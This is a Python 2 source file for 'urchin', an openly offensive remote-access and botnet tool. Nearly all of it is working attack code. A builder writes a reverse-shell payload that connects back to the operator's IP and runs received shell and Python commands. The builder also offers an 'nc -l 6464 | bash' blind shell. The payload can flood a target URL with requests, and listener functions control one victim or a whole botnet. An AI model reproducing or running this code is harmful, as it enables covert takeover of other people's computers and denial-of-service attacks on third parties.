#!/usr/bin/python
import socket, os, sys, platform, threading, time, getpass, urllib2

connections = []
addresses = []
u = getpass.getuser()

if 'Windows' in platform.system():
        os.system('cls')
        print "  |     |  | ,--` ,--` |  | --- ,--`"
        print "\ * /   |  | |  | |    |  |  |  |  |"
        print "-*+*-   |  | |--, |    |--|  |  |  |"
        print "/ * \   |  | | \  |    |  |  |  |  |"
        print "  |     `__, |  \ `__, |  | --- |  |"
        print ""
        print "Developer : keeganjk"
        print "Version   : v1.4 (Pickelhelm)"
else:
        os.system("clear")
        print "  |     |  | ,--` ,--` |  | --- ,--`"
        print "\ * /   |  | |  | |    |  |  |  |  |"
        print "-*+*-   |  | |--, |    |--|  |  |  |"
        print "/ * \   |  | | \  |    |  |  |  |  |"
        print "  |     `__, |  \ `__, |  | --- |  |"
        print ""
        print "Developer : \033[1;31mkeeganjk\033[0;0m"
        print "Version   : v1.4 (\033[0;32mPickelhelm\033[0;0m)"

try:
        public_ip = urllib2.urlopen('http://icanhazip.com').read()
except:
        public_ip = "\n"

print ""
print "Public IP : " + public_ip

def build(ip, fn):
        dotExtension = ""
        print ""
        try:
                if "Darwin" in platform.system():
                        if u == "root":
                                fn = fn.replace("~", "/var/root")
                        else:
                                fn = fn.replace("~", "/Users/" + u)
                else:
                        if u == "root":
                                fn = fn.replace("~", "/root")
                        else:
                                fn = fn.replace("~", "/home/" + u)
        except Exception as err:
                print err
                main()
        print "[>] What build type do you want to use?:"
        print "    [0] Python  [Reverse Shell]"
        print "    [1] BASh/nc [ Blind Shell ]"
        print
        choice = raw_input("urchin > ")
        if choice == "0":
            print
            choice = raw_input("Would you like to add .py extension? [y/n]: ")
            if choice.lower() == "y":
                fn = fn + ".py"
            print "[*] Creating file : " + fn + " ..."
            f = open(fn, 'w')
            print "[*] Building " + fn + " ...\n"
            f.write("#!/usr/bin/python\n")
            sys.stdout.write("#!/usr/bin/python\n")
            f.write("import socket, os, sys, platform, webbrowser, random, string\n")
            sys.stdout.write("import socket, os, sys, platform, webbrowser, random, string\n")
            f.write("s = socket.socket()\n")
            sys.stdout.write("s = socket.socket()\n")
            f.write("host = " + "'" + ip + "'\n")
            sys.stdout.write("host = " + "'" + ip + "'\n")
            f.write("port = 6464\n")
            sys.stdout.write("port = 6464\n")
            f.write("s.connect((host, port))\n")
            sys.stdout.write("s.connect((host, port))\n")
            f.write("def command_line():\n")
            sys.stdout.write("def command_line():\n")
            f.write("       while True:\n")
            sys.stdout.write("       while True:\n")
            f.write("               cmd = s.recv(8192)\n")
            sys.stdout.write("               cmd = s.recv(8192)\n")
            f.write("               if cmd[:2] == 'cd' and cmd != 'cd':\n")
            sys.stdout.write("               if cmd[:2] == 'cd' and cmd != 'cd':\n")
            f.write("                       os.chdir(str(cmd[3:]))\n")
            sys.stdout.write("                       os.chdir(str(cmd[3:]))\n")
            f.write("                       o = ' '\n")
            sys.stdout.write("                       o = ' '\n")
            f.write("                       s.send(o)\n")
            sys.stdout.write("                       s.send(o)\n")
            f.write("               elif cmd == 'python':\n")
            sys.stdout.write("               elif cmd == 'python':\n")
            f.write("                       while cmd != 'exit()':\n")
            sys.stdout.write("                       while cmd != 'exit()':\n")
            f.write("                               cmd = s.recv(8192)\n")
            sys.stdout.write("                               cmd = s.recv(8192)\n")
            f.write("                       if cmd == 'exit()':\n")
            sys.stdout.write("                       if cmd == 'exit()':\n")
            f.write("                               pass\n")
            sys.stdout.write("                               pass\n")
            f.write("                       else:\n")
            sys.stdout.write("                       else:\n")
            f.write("                               try:\n")
            sys.stdout.write("                               try:\n")
            f.write("                                       exec cmd\n")
            sys.stdout.write("                                       exec cmd\n")
            f.write("                               except:\n")
            sys.stdout.write("                               except:\n")
            f.write("                                       o = ' '\n")
            sys.stdout.write("                                       o = ' '\n")
            f.write("               elif cmd == 'info':\n")
            sys.stdout.write("               elif cmd == 'info':\n")
            f.write("                       o = str(platform.uname())\n")
            sys.stdout.write("                       o = str(platform.uname())\n")
            f.write("                       s.send(o)\n")
            sys.stdout.write("                       s.send(o)\n")
            f.write("               elif cmd[:7] == 'browser':\n")
            sys.stdout.write("               elif cmd[:7] == 'browser':\n")
            f.write("                       webbrowser.open(cmd[8:])\n")
            sys.stdout.write("                       webbrowser.open(cmd[8:])\n")
            f.write("                       s.send('True')\n")
            sys.stdout.write("                       s.send('True')\n")
            f.write("               elif cmd[:5] == 'flood':\n")
            sys.stdout.write("               elif cmd[:5] == 'flood':\n")
            f.write("                       url = cmd[6:]\n")
            sys.stdout.write("                       url = cmd[6:]\n")
            f.write("                       url.replace('https://', '')\n")
            sys.stdout.write("                       url.replace('https://', '')\n")
            f.write("                       url.replace('http://', '')\n")
            sys.stdout.write("                       url.replace('http://', '')\n")
            f.write("                       s.send('[*] Flooding ' + url + ' ...')\n")
            sys.stdout.write("                       s.send('[*] Flooding ' + url + ' ...')\n")
            f.write("                       chars = string.ascii_lowercase + string.digits + '.' + '/'\n")
            sys.stdout.write("                       chars = string.ascii_lowercase + string.digits + '.' + '/'\n")
            f.write("                       while True:\n")
            sys.stdout.write("                       while True:\n")
            f.write("                               ln = random.randint(1, 16)\n")
            sys.stdout.write("                               ln = random.randint(1, 16)\n")
            f.write("                               rs = random.sample(chars, ln)\n")
            sys.stdout.write("                               rs = random.sample(chars, ln)\n")
            f.write("                               rs = ''.join(rs)\n")
            sys.stdout.write("                               rs = ''.join(rs)\n")
            f.write("                               fs = socket.socket()\n")
            sys.stdout.write("                               fs = socket.socket()\n")
            f.write("                               fs.connect((url, 80))\n")
            sys.stdout.write("                               fs.connect((url, 80))\n")
            f.write("                               fs.send('GET' + rs + 'HTTP/1.1\\r\\n\\r\\n')\n")
            sys.stdout.write("                               fs.send('GET' + rs + 'HTTP/1.1\\r\\n\\r\\n')\n")
            f.write("                               o = fs.recv(8192)\n")
            sys.stdout.write("                               o = fs.recv(8192)\n")
            f.write("                               fs.close()\n")
            sys.stdout.write("                               fs.close()\n")
            f.write("                               s.send(o)\n")
            sys.stdout.write("                               s.send(o)\n")
            f.write("               elif cmd == 'quit':\n")
            sys.stdout.write("               elif cmd == 'quit':\n")
            f.write("                               s.close()\n")
            sys.stdout.write("                               s.close()\n")
            f.write("                               sys.exit(0)\n")
            sys.stdout.write("                               sys.exit(0)\n")
            f.write("               else:\n")
            sys.stdout.write("               else:\n")
            f.write("                       o = os.popen(cmd).read()\n")
            sys.stdout.write("                       o = os.popen(cmd).read()\n")
            f.write("                       s.send(o)\n\n")
            sys.stdout.write("                       s.send(o)\n\n")
            f.write("command_line()\n")
            sys.stdout.write("command_line()\n")
            f.close()
            print "\n[+] " + fn + " built !"
        elif choice == "1":
            print
            choice = raw_input("Would you like to add .command extension? [y/n]: ")
            if choice.lower() == "y":
                fn = fn + ".command"
            print "[*] Creating file : " + fn + " ..."
            f = open(fn, 'w')
            print "[*] Building " + fn + " ...\n"
            f.write("#!/bin/bash\n")
            sys.stdout.write("#!/bin/bash\n")
            f.write("while true; do\n")
            sys.stdout.write("while true; do\n")
            f.write("nc -l 6464 | bash\n")
            sys.stdout.write("nc -l 6464 | bash\n")
            f.write("done\n")
            sys.stdout.write("done\n")
            f.close()
            print "\n[+] " + fn + " built !"
        else:
            main()
	print
        main()

def cmd_single_nc():
        print
        listener_ip = raw_input("Listener IP Address : ")
        port = 6464
        s = socket.socket()
        s.connect((listener_ip, port))
        print "\n[+] Connected to " + listener_ip + "!\n"
        while True:
            cmd = raw_input(listener_ip + " > ")
            s.send(cmd + "\n")

def cmd_single():
        print ""
        print "[*] Listening for connection ..."
        port = 6464
        s = socket.socket()
        s.bind(('', port))
        s.listen(5)
        c, addr = s.accept()
        print "[+] Accepted connection from ", addr[0], "!"
        print ""
        while True:
                cmd = raw_input(addr[0] + " > ")
                if cmd == "python":
                        try:
                                c.send(cmd)
                        except:
                                print "\n[-] Connection lost !"
                                cmd_single()
                        while cmd != "exit()":
                                cmd = raw_input(">>> ")
                                if cmd != 'exit()':
                                        exec cmd
                                try:
                                        c.send(cmd)
                                except:
                                        print "\n[-] Connection lost !"
                                        s.close()
                                        cmd_single()

                elif cmd == "bash":
                        while True:
                                cmd = raw_input("bash$ ")
                                cmd = "bash -c '" + cmd + "'"
                                try:
                                        c.send(cmd)
                                        print c.recv(8192)
                                except:
                                        print "\n[-] Connection lost !"
                                        s.close()
                                        cmd_single()

                elif cmd == "info":
                        try:
                                c.send(cmd)
                                print c.recv(8192)
                        except:
                                print "\n[-] Connection lost !"
                                s.close()
                                cmd_single()

                elif cmd == "list":
                        print str(addr[0]) + "\n"

                elif cmd == "flood":
                        url = raw_input("URL : ")
                        url = url.replace("http://", "")
                        url = url.replace("https://", "")
                        try:
                                c.send("flood " + url)
                                while True:
                                        try:
                                                print c.recv(8192)
                                        except:
                                                print "\n[-] Connection lost !"
                                                s.close()
                                                cmd_single()
                        except:
                                print "\n[-] Connection lost !"
                                s.close()
                                cmd_single()

                elif cmd == "browser":
                        url = raw_input("URL : ")
                        try:
                                c.send("browser " + url)
                                print c.recv(8192)
                        except:
                                print "\n[-] Connection lost !"
                                s.close()
                                cmd_single()

                elif cmd == "help":
                        print ""
                        print "-" * 40
                        print "\nHere is a list of urchin commands:\n"
                        print "=" * 40
                        print "\nbash    : Opens a BASh shell if available\n"
                        print "browser : Opens web browser with specified URL as the page to open\n"
                        print "exit    : Closes connection\n"
                        print "flood   : Floods the specified URL\n"
                        print "help    : Displays this message\n"
                        print "info    : Lists info about target, including OS, node, processor, etc.\n"
                        print "list    : Lists connected IP Addresses\n"
                        print "python  : Opens a Python shell\n"
                        print "quit    : Same as exit\n"
                        print "=" * 40
                        print "\nOutput for 'help' on the client's machine:\n"
                        c.send('help')
                        print c.recv(8192) + "\n"

                elif cmd == "quit" or cmd == "exit":
                        try:
                                c.send('quit')
                                s.close()
                        except:
                                s.close()
                                print "\n[-] Connection lost !"
                        main()
                else:
                        try:
                                c.send(cmd)
                                print c.recv(8192)
                        except:
                                print "\n[-] Connection lost !"
                                s.close()
                                cmd_single()

def botnet_cmd():
        global connections
        global addresses
        global s
        while True:
                time.sleep(1)
                count = 0
                cmd = raw_input(str(addresses) + " > ")
                if cmd == "python":
                        for c in connections:
                                try:
                                        c.send(cmd)
                                except:
                                        del addresses[count]
                                count += 1
                        while cmd != "exit()":
                                        cmd = raw_input(">>> ")
                                        if cmd != 'exit()':
                                                exec cmd
                                        for c in connections:
                                                try:
                                                        c.send(cmd)
                                                except:
                                                        del addresses[count]
                                                count += 1

                elif cmd == "bash":
                        while True:
                                cmd = raw_input("bash$ ")
                                cmd = "bash -c '" + cmd + "'"
                                for c in connections:
                                        try:
                                                c.send(cmd)
                                                o = c.recv(8192)
                                                if o == None:
                                                        del addresses[count]
                                                print "\n" + addresses[count] + " : \n" + o + "\n"
                                        except:
                                                del addresses[count]
                                        count += 1

                elif cmd == "info":
                        for c in connections:
                                try:
                                        c.send(cmd)
                                        o = c.recv(8192)
                                        if o == None:
                                                del addresses[count]
                                        print "\n" + addresses[count] + " : \n" + o + "\n"
                                except:
                                        del addresses[count]
                                count += 1

                elif cmd == "list":
                        print str(addresses) + "\n"

                elif cmd == "flood":
                        url = raw_input("URL : ")
                        url = url.replace("http://", "")
                        url = url.replace("https://", "")
                        for c in connections:
                                try:
                                        c.send("flood " + url)
                                except:
                                        del addresses[count]
                        while True:
                                try:
                                        c.send("flood " + url)
                                        print c.recv(8192)
                                except:
                                        pass

                elif cmd == "browser":
                        url = raw_input("URL : ")
                        for c in connections:
                                try:
                                        c.send("browser " + url)
                                        o = c.recv(8192)
                                        if o == None:
                                                del addresses[count]
                                        print o
                                except:
                                        del addresses[count]
                                count += 1

                elif cmd == "help":
                        print ""
                        print "-" * 40
                        print "\nHere is a list of urchin commands:\n"
                        print "=" * 40
                        print "\nbash    : Opens a BASh shell if available\n"
                        print "browser : Opens web browser with specified URL as the page to open\n"
                        print "exit    : Closes connection\n"
                        print "flood   : Floods the specified URL\n"
                        print "help    : Displays this message\n"
                        print "info    : Lists info about target, including OS, node, processor, etc.\n"
                        print "list    : Lists connected IP Addresses\n"
                        print "python  : Opens a Python shell\n"
                        print "quit    : Same as exit\n"
                        print "=" * 40
                        print "\nOutput for 'help' on the client's machine:\n"
                        for c in connections:
                                try:
                                        c.send('help')
                                        o = c.recv(8192) + "\n"
                                        if o == None:
                                                del addresses[count]
                                        print o
                                except:
                                        del addresses[count]
                                count += 1

                elif cmd == "quit" or cmd == "exit":
                        for c in connections:
                                try:
                                        c.send('quit')
                                except:
                                        print "\n[-] Connection lost !"
                        s.close()
                        main()
                else:
                        for c in connections:
                                try:
                                        c.send(cmd)
                                        o = c.recv(8192)
                                        if o == None:
                                                del addresses[count]
                                        print "\n" + addresses[count] + " : \n" + o + "\n"
                                except:
                                        del addresses[count]
                                count += 1

def botnet_accept_conn():
        print ""
        print "[*] Listening for connections ...\n"
        global s
        port = 6464
        s = socket.socket()
        s.bind(('', port))
        global c
        global addr
        while True:
                s.listen(5)
                c, addr = s.accept()
                connections.append(c)
                addresses.append(addr[0])
                print "\n\n[+] Accepted connection from " + str(addr[0]) + "!\n\n" + str(addresses) + " > ",
                c.setblocking(1)

def main():
        choice = None
        print "[>] Please select an option from below:"
        print "    [0]  Build shell file"
        print "    [1]  Listen for connections [Single][Reverse Shell]"
        print "    [2]  Listen for connections [Botnet][Reverse Shell]"
        print "    [3]  Connect to listener    [Single][ Blind Shell ]"
        print "    [99] Exit"
        print
        choice = raw_input("urchin > ")
        if choice == '0':
                print
                ip = raw_input("Enter server's IP Address : ")
                fn = raw_input("Enter a filename : ")
                build(ip, fn)
        elif choice == '1':
                cmd_single()
        elif choice == '2':
                t1 = threading.Thread(target=botnet_accept_conn)
                t1.daemon = True
                t1.start()
                botnet_cmd()
        elif choice == '3':
                cmd_single_nc()
        elif choice == '99':
                sys.exit(0)
        else:
                main()


main()
